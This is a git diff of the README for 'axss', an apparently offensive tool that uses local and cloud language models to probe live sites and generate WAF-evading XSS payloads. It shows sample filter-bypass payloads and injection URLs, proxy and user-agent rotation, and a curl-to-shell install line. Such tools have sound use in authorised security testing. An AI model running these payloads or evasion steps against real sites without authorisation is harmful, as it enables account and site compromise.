@@ -5,36 +5,73 @@
 ![Ollama](https://img.shields.io/badge/Ollama-local%20runtime-111111?logo=ollama&logoColor=white)
 ![Qwen3.5](https://img.shields.io/badge/Qwen3.5-4B%20%7C%209B%20%7C%2027B%20%7C%2035B-0F766E)
 
-`axss` is a context-aware XSS recon CLI that parses target HTML, detects likely DOM sinks and framework fingerprints, then generates ranked payloads with an Ollama-first Qwen3.5 workflow plus heuristic fallback.
+`axss` is a context-aware XSS recon CLI that actively probes live targets, maps filter behavior, detects DOM sinks and framework fingerprints, and generates ranked, ready-to-fire payloads — including filter bypass variants tailored to what the probe observed. It runs entirely local-first with a self-learning findings store that gets smarter over time.
 
-`--public` pulls known XSS payloads from public and community sources and injects them as reference examples into the model prompt, so Qwen learns from real-world bypass patterns before generating target-specific payloads. `--waf` loads WAF-specific bypass lists and primes the model with evasion context; the WAF is auto-detected from response headers on live targets and can be overridden manually.
+## How it works
 
-Live crawling uses a quiet Scrapy spider with selector-based parsing, which makes multi-URL recon less noisy and scales better than the earlier BeautifulSoup fetch path.
+```
+fetch target HTML
+    ↓
+passive analysis
+  • DOM sink detection (innerHTML, eval, location.href, jQuery, dangerouslySetInnerHTML, …)
+  • Framework fingerprinting (React, Vue, Angular, AngularJS)
+  • HTML attribute reflection (href, on*, srcdoc, style)
+  • Encoding chain detection (base64, base32, URL, gzip+base64, rot13, …)
+    ↓
+active probing  (default on live URLs, disable with --no-probe)
+  phase 1: canary per parameter → finds reflection points and classifies context
+           (js_string_dq/sq/bt, html_attr_url/value/event, html_body, html_comment, json_value)
+  phase 2: char survival probe → confirms which XSS-critical chars survive the filter
+    ↓
+payload generation  (escalation chain)
+  1. local Ollama (findings-enriched prompt — probe results + past bypass examples upfront)
+  2. if local output is weak AND a cloud key is set → OpenRouter or OpenAI
+     cloud payloads are saved to the findings store for future local runs
+  3. heuristic engine always runs in parallel (context-aware, no LLM needed)
+    ↓
+ranking + threshold filter
+  scored by sink match, probe confirmation, bypass family relevance, surviving chars
+  default threshold: 60 — always shows at least 5 payloads
+```
 
-## Why Qwen3.5
+## Self-learning findings store
 
-Qwen3.5 is a strong default for this project because the task is not just "write an XSS string." It has to read HTML, follow JavaScript context, notice framework clues, and mutate payloads toward likely execution paths.
+Every time a cloud model generates payloads, `axss` saves them to `~/.axss/findings.jsonl` keyed by sink type, reflection context, and surviving characters. On the next scan of a similar target, those findings are injected as few-shot examples into the local model prompt — so the local model reasons from real bypass patterns discovered by the stronger cloud model, without ever needing to call the cloud again.
 
-- Better reasoning fit for multi-step DOM sink analysis and source-to-sink tracing.
-- Better coding fit for JavaScript-heavy targets, inline handlers, and framework-specific payload mutation.
-- Strong local-model range: `4b` for low-memory laptops, `9b` as the balanced default, `27b` for higher-quality reasoning, and `35b` when you have real GPU headroom.
-- Works locally through Ollama, with heuristic fallback if Ollama is unavailable and optional OpenAI fallback via `OPENAI_API_KEY`.
+The store grows silently in the background, capped at 500 entries (oldest roll off). Nothing is sent anywhere; it stays entirely local.
 
-## Features
+## Active probing
 
-- Parses a live URL with `-u, --url TARGET`, a batch file with `--urls FILE`, or local HTML/snippets with `-i, --input FILE_OR_SNIPPET`.
-- Detects forms, inputs, inline scripts, DOM sinks, variables, objects, and framework fingerprints.
-- Uses Scrapy selectors for HTML extraction and a quiet `AxssSpider` for larger live recon runs.
-- Uses Ollama-first generation with Qwen3.5 model overrides via `-m, --model`.
-- `--public` fetches known XSS payloads from payloadbox, AwesomeXSS, community repos, and Nitter (best-effort), then injects a technique-diverse sample as reference examples into the model prompt so Qwen reasons from real bypass patterns rather than generating from scratch.
-- `--waf NAME` loads embedded bypass payload lists for the named WAF and tells the model to prioritise matching evasion techniques. Auto-detected from response headers on live targets; use the flag to override or set manually. Supported: `cloudflare`, `akamai`, `imperva`, `aws`, `f5`, `modsecurity`, `fastly`, `sucuri`, `barracuda`, `wordfence`, `azure`.
-- `--public` is also usable standalone (no target required) to dump a filtered public payload list.
-- Fetched payload lists are cached in `~/.cache/axss/` with a 24-hour TTL (6 hours for social sources).
-- Color-coded output: risk scores are red / yellow / green by severity; step-by-step progress indicators are always visible during a run.
-- `-r, --rate N` caps requests per second against the target (default: 25). Set to `0` for uncapped. Keeps you out of rate-limit bans on strict platforms.
-- Lists local models with `-l, --list-models` and searches model names with `-s, --search-models QUERY`.
-- Ranks payloads in `list`, `heat`, or `json` output modes.
-- Ships with `setup.sh`, which installs Ollama with the official curl script when needed, auto-selects a Qwen3.5 tier, pulls it, creates `~/.axss/config.json`, builds the venv, and symlinks `~/.local/bin/axss`.
+When scanning a live URL with query parameters, `axss` runs two probe requests per parameter by default:
+
+1. **Canary request** — injects a unique token to find every reflection point and classify the HTML/JS context at each one.
+2. **Char survival request** — wraps XSS-critical characters (`< > " ' ( ) ; / \ ` { }`) in sentinel markers to confirm which ones survive the server's filter.
+
+Probe results flow directly into payload generation: the LLM prompt leads with surviving chars and confirmed sink context; the heuristic engine generates bypass payloads tailored to what was observed (e.g. `java%09script:` tab bypass when `(` and `)` survive but `javascript:` is filtered in an href sink).
+
+Live probe output streams as results arrive. Use `--no-live` to suppress streaming, `--no-probe` to skip probing entirely.
+
+## Model escalation chain
+
+```
+Local Ollama  (qwen3.5:9b default, findings-enriched prompt)
+    ↓  if output is weak (< 3 payloads or all generic)
+OpenRouter    (preferred cloud — set OPENROUTER_API_KEY)
+    ↓  if OpenRouter unavailable or fails
+OpenAI        (gpt-4o-mini — set OPENAI_API_KEY)
+    ↓  if no API keys / both fail
+Heuristic-only  (always works, no network needed)
+```
+
+Cloud escalation only triggers when the local model's output fails a quality check. Use `--no-cloud` to guarantee offline-only operation even if a key is set, or set `use_cloud: false` in `~/.axss/config.json` to make that permanent.
+
+## Payload generation
+
+`axss` combines three sources and ranks the union:
+
+- **Heuristic engine** — context-aware, deterministic. Generates payloads for every detected sink: encoded param delivery (base64/UU/etc.), href whitespace bypasses (`%09`/`%0a`/`%0d` in scheme), event handler injection, DOM source payloads, jQuery HTML sinks, probe-confirmed contexts, and more.
+- **LLM generation** — local Ollama (or cloud fallback) receives the full parsed context, probe results, and relevant past findings, then generates additional targeted payloads.
+- **Public payload database** — `--public` fetches community XSS payloads and injects a diverse sample as reference examples into the LLM prompt.
 
 ## Setup
 
@@ -45,300 +82,218 @@ Qwen3.5 is a strong default for this project because the task is not just "write
 axss --help
 ```
 
-`setup.sh` does all of the following:
+`setup.sh` installs Ollama (if missing), detects your RAM/VRAM, pulls the right Qwen3.5 tier, writes `~/.axss/config.json`, builds the venv, and symlinks `axss` to `~/.local/bin/axss`.
 
-- Installs Ollama automatically with `curl -fsSL https://ollama.com/install.sh | sh` when `ollama` is missing.
-- Detects RAM and NVIDIA VRAM, then selects a Qwen3.5 tier.
-- Starts `ollama serve` if needed and runs `ollama pull` for the selected model.
-- Writes `~/.axss/config.json` with `default_model`.
-- Creates or refreshes `venv`, installs `requirements.txt`, and symlinks `axss` to `~/.local/bin/axss`.
-
-### Manual Ollama setup
-
-If you want to control the install yourself:
-
-1. Install Ollama.
+### Manual setup
 
 ```bash
-# official installer
+# 1. Install Ollama
 curl -fsSL https://ollama.com/install.sh | sh
-
-# then start the local runtime
 ollama serve
-```
 
-`setup.sh` uses that same official installer automatically when `ollama` is missing.
+# 2. Pull a model
+ollama pull qwen3.5:9b   # balanced default
+ollama pull qwen3.5:4b   # low memory
+ollama pull qwen3.5:27b  # higher quality (32 GB+ RAM)
+ollama pull qwen3.5:35b  # GPU tier (24 GB+ VRAM)
 
-2. Pull the Qwen3.5 size that matches your machine.
-
-```bash
-# low-memory / smallest local footprint
-ollama pull qwen3.5:4b
-
-# standard default for most systems
-ollama pull qwen3.5:9b
-
-# higher quality if you have 32 GB+ RAM
-ollama pull qwen3.5:27b
-
-# highest tier here, intended for systems with 24 GB+ NVIDIA VRAM
-ollama pull qwen3.5:35b
-```
-
-Sizing guidance used by `setup.sh`:
-
-| Tier | Model | Recommended hardware |
-| --- | --- | --- |
-| Low | `qwen3.5:4b` | Less than 8 GB RAM |
-| Standard | `qwen3.5:9b` | 8 GB to under 32 GB RAM |
-| High | `qwen3.5:27b` | 32 GB+ RAM |
-| GPU high | `qwen3.5:35b` | 24 GB+ NVIDIA VRAM |
-
-3. Create `~/.axss/config.json`.
-
-```json
+# 3. Configure
+mkdir -p ~/.axss
+cat > ~/.axss/config.json <<'EOF'
 {
-  "default_model": "qwen3.5:9b"
+  "default_model": "qwen3.5:9b",
+  "use_cloud": true,
+  "cloud_model": "anthropic/claude-3-5-sonnet"
 }
-```
+EOF
 
-4. Install the CLI locally.
-
-```bash
+# 4. Install
 python3 -m venv venv
 source venv/bin/activate
-python -m pip install --upgrade pip
-python -m pip install -r requirements.txt
-./axss --help
+pip install -r requirements.txt
 ```
 
-If `~/.local/bin` is not on your `PATH`, add:
+### Model sizing
+
+| Tier | Model | Recommended hardware |
+|------|-------|----------------------|
+| Low | `qwen3.5:4b` | < 8 GB RAM |
+| Standard | `qwen3.5:9b` | 8–32 GB RAM |
+| High | `qwen3.5:27b` | 32 GB+ RAM |
+| GPU | `qwen3.5:35b` | 24 GB+ NVIDIA VRAM |
+
+### Cloud configuration (optional)
 
 ```bash
-export PATH="$HOME/.local/bin:$PATH"
+export OPENROUTER_API_KEY="sk-or-..."   # preferred
+export OPENAI_API_KEY="sk-..."          # fallback
+
+# Set preferred OpenRouter model in ~/.axss/config.json:
+# "cloud_model": "google/gemini-2.0-flash-001"
 ```
 
 ## Usage
 
 ### Common examples
 
-List local Ollama models:
-
 ```bash
+# Scan a live target with active probing (default)
+axss -u "https://example.com/search?q=test"
+
+# Verbose output — see probe results, findings store hits, escalation decisions
+axss -u "https://example.com/search?q=test" -v --threshold 50
+
+# Skip active probing (passive analysis only)
+axss -u "https://example.com" --no-probe
+
+# Suppress live probe stream, show final output only
+axss -u "https://example.com?q=test" --no-live
+
+# Force offline — never escalate to cloud even if keys are set
+axss -u "https://example.com?q=test" --no-cloud
+
+# Public payload reference + WAF context
+axss -u "https://example.com?q=test" --public --waf cloudflare -o heat
+
+# Parse local HTML
+axss -i sample_target.html -o list -t 10
+
+# Parse an inline HTML snippet
+axss -i '<script>eval(location.hash.slice(1))</script>'
+
+# Batch scan with rate limiting
+axss --urls urls.txt -r 5 -o list
+
+# Merge batch URLs into one payload set
+axss --urls urls.txt --merge-batch -o json -j result.json
+
+# Write JSON to disk
+axss -u "https://example.com?q=test" -o json -j result.json
+
+# Dump public payloads for a WAF (no target needed)
+axss --public --waf modsecurity -o list
+
+# List local Ollama models
 axss -l
-```
 
-Search for Qwen3.5 tags available through your Ollama setup:
-
-```bash
+# Search available models
 axss -s qwen3.5
 ```
 
-Scan the included sample target and print the top payloads:
+### All flags
 
-```bash
-axss -i sample_target.html -o list -t 10
-```
+| Flag | Default | Description |
+|------|---------|-------------|
+| `-u, --url TARGET` | — | Fetch and scan a live URL |
+| `--urls FILE` | — | Scan one URL per line from a file |
+| `-i, --input FILE_OR_SNIPPET` | — | Parse a local file or raw HTML string |
+| `--public` | off | Fetch community XSS payloads and inject as reference |
+| `--waf NAME` | auto | Set WAF context (auto-detected from response headers) |
+| `-m, --model MODEL` | config | Override the local Ollama model |
+| `-o, --output` | `list` | Output format: `list`, `heat`, `json`, `interactive` |
+| `-t, --top N` | 20 | Max payloads to display |
+| `-j, --json-out PATH` | — | Always write full JSON result to this path |
+| `-r, --rate N` | 25 | Max requests/sec against target (0 = uncapped) |
+| `--threshold N` | 60 | Min risk score for output (always shows ≥ 5) |
+| `--no-probe` | off | Skip active parameter probing |
+| `--no-live` | off | Suppress streaming probe output |
+| `--no-cloud` | off | Never escalate to cloud LLM |
+| `-v, --verbose` | off | Show detailed sub-step progress |
+| `--merge-batch` | off | Combine batch contexts into one payload set |
+| `-l, --list-models` | — | List local Ollama models |
+| `-s, --search-models QUERY` | — | Search Ollama model library |
+| `-V, --version` | — | Show version |
 
-Probe an inline HTML snippet and render the heat view:
+### Supported WAFs
 
-```bash
-axss -i '<div onclick="{{user}}"></div><script>eval(location.hash.slice(1))</script>' -o heat
-```
+`cloudflare`, `akamai`, `imperva`, `aws`, `f5`, `modsecurity`, `fastly`, `sucuri`, `barracuda`, `wordfence`, `azure`
 
-Fetch a live target and write the full JSON result to disk:
+## Output modes
 
-```bash
-axss -u https://example.com -m qwen3.5:9b -o json -j result.json
-```
+- **`list`** — ranked table with payload, inject vector, tags, and risk score.
+- **`heat`** — compact risk heat view, good for quick triage.
+- **`json`** — full structured output for automation and post-processing.
+- **`interactive`** — browse payloads in a scrollable TUI.
 
-Scan a batch list and print the top payloads for each URL:
-
-```bash
-axss --urls urls.txt -t 5 -o list
-```
-
-Merge a batch into one combined payload set while still writing per-URL JSON:
-
-```bash
-axss --urls urls.txt --merge-batch -o json -j batch.json
-```
-
-Force the smaller Qwen3.5 model when you want lower memory usage:
-
-```bash
-axss -u https://example.com -m qwen3.5:4b -o list -t 5
-```
-
-Slow down to 5 req/sec for a strict target:
-
-```bash
-axss -u https://example.com -r 5 -o list
-```
-
-Run uncapped (no rate limit):
-
-```bash
-axss --urls urls.txt -r 0 -o list
-```
-
-Fetch public payloads and scan a live target with WAF context:
-
-```bash
-axss -u https://example.com --public --waf cloudflare -o heat
-```
-
-Dump all public payloads for a specific WAF without a target:
-
-```bash
-axss --public --waf modsecurity -o list
-```
-
-Dump all public payloads standalone:
-
-```bash
-axss --public -o list
-```
-
-Scan a live target — WAF is auto-detected from response headers:
-
-```bash
-axss -u https://example.com --public -o list -t 15
-```
-
-Show detailed sub-step progress while scanning a local target:
-
-```bash
-axss -v -i sample_target.html -t 5 -o list
-```
-
-Run the bundled demo:
-
-```bash
-./demo_top5.sh
-```
-
-### Help excerpt
+## Sample output
 
 ```text
-$ axss --help
-usage: axss [-h] [-u TARGET | --urls FILE | -i FILE_OR_SNIPPET | -l | -s QUERY]
-            [--public] [--waf NAME] [-m MODEL] [-o {json,list,heat}] [-t N]
-            [-j PATH] [-v] [--merge-batch] [-V]
+$ axss -u "https://target.example/page?url=test" -v --threshold 70
 
-Parse local or live HTML, identify likely XSS execution points, and rank payloads with Ollama-first generation.
-
-options:
-  -h, --help            Show this help message and exit.
-  -u, --url TARGET      --url TARGET (fetch live HTML), e.g. -u https://example.com
-  --urls FILE           --urls FILE (fetch one URL per line), e.g. --urls urls.txt
-  -i, --input FILE_OR_SNIPPET
-                        --input FILE_OR_SNIPPET (parse a local file or raw HTML),
-                        e.g. -i sample_target.html
-  -l, --list-models     --list-models (show locally available Ollama models), e.g. -l
-  -s, --search-models QUERY
-                        --search-models QUERY (search Ollama model names), e.g. -s qwen3.5
-  --public              Fetch known XSS payloads from public/community sources and inject
-                        them as reference context into the model prompt. Can be used
-                        standalone (no target required) to dump a payload list.
-  --waf NAME            Target WAF (akamai, aws, azure, barracuda, cloudflare, f5,
-                        fastly, imperva, modsecurity, sucuri, wordfence). Auto-detected
-                        from response headers when -u/--urls is used; use this flag to
-                        override or set manually.
-  -m, --model MODEL     --model MODEL (override the Ollama model), e.g. -m qwen3.5:4b
-  -o, --output {json,list,heat}
-                        --output {json,list,heat} (choose terminal format),
-                        e.g. -o list (default: list)
-  -t, --top N           --top N (limit ranked payloads), e.g. -t 10 (default: 20)
-  -j, --json-out PATH   --json-out PATH (always write the full JSON result),
-                        e.g. -j result.json
-  -r, --rate N          --rate N  Max requests per second against the target
-                        (default: 25). Use 0 for uncapped, e.g. -r 5 or -r 0
-  -v, --verbose         --verbose (print detailed sub-step progress),
-                        e.g. -v -i sample_target.html
-  --merge-batch         --merge-batch (combine batch contexts into one payload set),
-                        e.g. --urls urls.txt --merge-batch
-  -V, --version         show program's version number and exit
-
-Common combos:
-  axss -u https://example.com -t 10 -o list
-  axss -u https://example.com --public --waf cloudflare -o heat
-  axss --public --waf modsecurity -o list
-  axss --public -o list
-  axss --urls urls.txt -t 5 -o list
-  axss --urls urls.txt --merge-batch -o json -j result.json
-  axss -u https://example.com -m qwen3.5:9b -o list -t 3
-  axss -v -i sample_target.html -o heat
-  axss -l
-```
-
-## Output Modes
-
-- `list`: ranked table with payload, tags, and rationale.
-- `heat`: compact risk heat view.
-- `json`: full structured output, suitable for automation or post-processing.
-
-## Terminal Preview
-
-Sample run with `--public` and WAF context against a live target:
-
-```text
-$ axss -u https://example.com --public --waf cloudflare -o heat -t 8
-[*] Fetching public XSS payloads...
-[+] Loaded 847 public payloads (2 cached) — public_payloadbox=650, social_awesomexss=185, waf_cloudflare=12
-[*] Probing for WAF on https://example.com...
-[+] WAF detected: cloudflare
-[*] Fetching/parsing target: https://example.com
-[*] Generating payloads with qwen3.5:9b...
-[~] WAF context: cloudflare
-[~] Reference payloads: 20 examples loaded into prompt.
-[+] Done. 51 payloads ranked.
-
-Target: https://example.com (url) | engine=ollama | model=qwen3.5:9b | fallback=False | waf=cloudflare
-...
-```
-
-Sample run against a local file:
-
-```text
-$ axss -i sample_target.html -o heat -t 8
-[*] Fetching/parsing target: sample_target.html
-[*] Generating payloads with qwen3.5:9b...
+[~] Rate limit: 25 req/sec
+[*] Probing for WAF on https://target.example/page?url=test...
 [~] No WAF fingerprint detected — use --waf to set manually.
-[+] Done. 43 payloads ranked.
+[*] Fetching/parsing target: https://target.example/page?url=test
+[*] Active probing: 1 parameter(s) × 2 requests each...
+[+] [probe] 'url' → html_attr_url(href) | chars='()/;`{}' | INJECTABLE
 
-Target: file:sample_target.html (html) | engine=heuristic | model=qwen3.5:9b | fallback=True
-title=XSS Demo Target | frameworks=React | forms=1 | inputs=3 | handlers=0 | sinks=4
-notes: Parsed HTML with Scrapy selectors. Parsed scripts with esprima AST.
-# | Risk | Payload                                      | Focus                | Title
---+------+----------------------------------------------+----------------------+-------------------------
-1 | 72   | <form id=forms><input name=innerHTML value=… | innerHTML            | DOM clobber + property …
-2 | 62   | <svg><animate onbegin=alert(1) attributeNam… | innerHTML            | innerHTML SVG animate
-3 | 60   | {"__html":"<img src=x onerror=alert(1)>"}    | dangerouslySetInner… | React dangerouslySetInn…
-4 | 52   | "><svg/onload=alert(document.domain)>        | polyglot,attribute-… | SVG onload break-out
-5 | 52   | ';document.body.innerHTML='<img src=x onerr… | chain,innerHTML      | Script-to-DOM chain
+ 1. [96] JavaScript URI injection [url]
+    payload: javascript:alert(document.domain)
+    inject:  ?url=javascript%3Aalert%28document.domain%29
+    tags:    probe-confirmed, html_attr_url, param:url
 
-Risk scores are color-coded in the terminal: red (>=75), yellow (>=50), green (<50).
+[+] Probing complete: 1/1 parameter(s) injectable, 1 reflected.
+[*] Generating payloads with qwen3.5:9b...
+[~]   Findings store: no prior findings for this context.
+[~]   Generating payloads...
+[~]   Local model output weak — attempting cloud escalation...
+[~]   No cloud API keys configured — running heuristic-only.
+[+] Done. 6 payloads above threshold 70 (32 below, 38 total).
+
+ 1. [95] href javascript: bypass — leading tab (\x09)
+    payload: [TAB]javascript:alert(document.domain)
+    inject:  ?url=%09javascript%3Aalert%28document.domain%29
+    tags:    href, javascript-url, whitespace-bypass, filter-bypass
+
+ 2. [87] href javascript: bypass — tab (\x09) in scheme
+    payload: java[TAB]script:alert(document.domain)
+    inject:  ?url=java%09script%3Aalert%28document.domain%29
+    tags:    href, javascript-url, whitespace-bypass, filter-bypass
 ```
 
-### Payload table preview
+## Environment variables
 
-```text
-+----+------+----------------------------------------------+------------------------------+
-| #  | Risk | Payload                                      | Tags                         |
-+----+------+----------------------------------------------+------------------------------+
-| 1  | 72   | <form id=forms><input name=innerHTML value=… | dom-clobber, chain, innerHTML|
-| 2  | 62   | <svg><animate onbegin=alert(1) attributeNam… | innerHTML, svg, animate      |
-| 3  | 60   | {"__html":"<img src=x onerror=alert(1)>"}    | react, dangerouslySetInner…  |
-| 4  | 52   | "><svg/onload=alert(document.domain)>        | polyglot, attribute-breakout |
-+----+------+----------------------------------------------+------------------------------+
+| Variable | Purpose |
+|----------|---------|
+| `OPENROUTER_API_KEY` | Enables OpenRouter cloud escalation |
+| `OPENAI_API_KEY` | Enables OpenAI cloud escalation (fallback) |
+| `OLLAMA_HOST` | Override Ollama base URL (default: `http://127.0.0.1:11434`) |
+| `AXSS_USER_AGENTS` | File path or comma-separated User-Agent strings to rotate |
+| `AXSS_PROXIES` | File path or comma-separated proxy list |
+
+## Config file (`~/.axss/config.json`)
+
+```json
+{
+  "default_model": "qwen3.5:9b",
+  "use_cloud": true,
+  "cloud_model": "anthropic/claude-3-5-sonnet"
+}
 ```
 
-## Model Notes
+| Key | Default | Description |
+|-----|---------|-------------|
+| `default_model` | `qwen3.5:9b` | Local Ollama model |
+| `use_cloud` | `true` | Allow cloud escalation when local output is weak |
+| `cloud_model` | `anthropic/claude-3-5-sonnet` | Preferred OpenRouter model |
 
-- The default model comes from `~/.axss/config.json`; if that file is missing, `axss` falls back to `qwen3.5:9b`.
-- Supported Qwen3.5 sizes in this project are `qwen3.5:4b`, `qwen3.5:9b`, `qwen3.5:27b`, and `qwen3.5:35b`.
-- `axss -l` wraps `ollama list` and formats the results as a table.
-- `axss -s qwen3.5` prefers `ollama search qwen3.5` and falls back to Ollama web search if the installed CLI does not support local search.
-- Live crawling suppresses Scrapy logs by default and can rotate request user-agents or proxies with `AXSS_USER_AGENTS` and `AXSS_PROXIES`.
-- Without Ollama, the CLI still runs with heuristic generation. If `OPENAI_API_KEY` is set, it can also use `gpt-4o-mini` as a fallback path.
+## Findings store (`~/.axss/findings.jsonl`)
+
+Each line is a JSON object capturing:
+
+- `sink_type` — e.g. `reflected_in_href`, `js_string_via_base64`
+- `context_type` — e.g. `html_attr_url`, `js_string_dq`
+- `surviving_chars` — chars confirmed to survive the filter
+- `bypass_family` — one of 16 named families (whitespace-in-scheme, js-string-breakout, constructor-chain, …)
+- `payload` / `test_vector` — the exact payload and delivery vector
+- `model` — which model generated it
+- `verified` — manually confirmed to execute in browser
+
+Future local runs retrieve findings by scoring sink type match (+4), context type match (+3), surviving char overlap (+1–3), and verified status (+2), then inject the top matches as few-shot examples into the prompt.
+
+## Notes
+
+- The heuristic engine runs regardless of LLM availability — `axss` is always useful offline.
+- Live crawling uses Scrapling with stealth headers.
+- `axss -l` wraps `ollama list`; `axss -s <query>` prefers `ollama search` and falls back to Ollama web search.
+- The default model comes from `~/.axss/config.json`; falls back to `qwen3.5:9b` if missing.
